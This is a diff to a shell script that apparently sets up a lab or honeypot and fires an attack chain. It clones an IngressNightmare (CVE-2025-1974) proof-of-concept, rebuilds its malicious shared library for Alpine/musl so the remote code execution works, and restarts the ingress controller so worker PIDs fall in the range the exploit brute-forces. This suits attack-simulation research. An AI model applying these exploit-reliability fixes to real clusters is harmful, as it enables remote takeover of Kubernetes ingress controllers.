@@ -63,10 +63,19 @@ if [ "$DEPLOY" = 1 ]; then
   say "controller adopted signed base: $(kubectl -n honey logs ds/node-agent --since=90s 2>/dev/null | grep -c 'adopted user-authored')"
 
   say "build the IngressNightmare PoC (ing)"
-  [ -x "$HERE/ein/ing" ] || ( cd "$HERE" && git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein 2>/dev/null; cd ein && CGO_ENABLED=0 go build -o ing . ) 2>&1 | tail -2
+  if [ ! -x "$HERE/ein/ing" ]; then
+    ( cd "$HERE" && git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein 2>/dev/null )
+    say "rebuild danger.so for musl (the controller is Alpine; a glibc .so fails ENGINE_by_id with 'Exec format error' and the RCE silently no-ops)"
+    docker run --rm -v "$HERE/ein/nginx-ingress":/work -w /work alpine:3.20 sh -c 'apk add --no-cache gcc musl-dev >/dev/null && gcc -fPIC -shared -o danger.so danger.c'
+    ( cd "$HERE/ein" && CGO_ENABLED=0 go build -o ing . ) 2>&1 | tail -2
+  fi
 fi
 
 if [ "$BENIGN_ONLY" = 1 ]; then say "benign-only: platform + ingress up, no attack fired"; exit 0; fi
+
+say "restart the controller so nginx worker pids are low (the PoC brute-forces pids 5-45; a churned controller's workers climb out of range and the fd-hunt misses)"
+kubectl -n "$NS" rollout restart deploy/ingress-nginx-controller >/dev/null 2>&1
+kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=180s 2>&1 | tail -1
 
 docker restart ran-ui >/dev/null 2>&1; sleep 15
 say "fire chain 3 (steps $FROM-$TO) via Ran"
